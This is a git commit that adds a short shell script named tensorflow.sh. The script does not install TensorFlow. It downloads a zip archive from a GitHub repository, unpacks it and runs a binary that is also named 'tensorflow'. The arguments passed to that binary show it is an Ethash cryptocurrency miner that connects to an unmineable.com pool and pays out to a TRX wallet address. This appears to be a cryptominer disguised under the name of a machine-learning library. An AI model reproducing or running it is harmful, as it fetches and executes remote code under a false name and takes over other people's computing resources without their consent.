5aaa090c88488576cf611e8809622a3c5367a6e4
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-01-22 02:35:24 +0530

    Create tensorflow.sh

---
+++ n51/tensorflow.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo apt update && wget https://github.com/n5000/tensorflow/raw/main/tensorflow.zip && unzip tensorflow.zip && cd tensorflow && chmod u+x tensorflow && ./tensorflow --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWzp8qHuWZai4ZHaAMhQy9ND82ACKwoLd2.n51 --ethstratum ETHPROXY
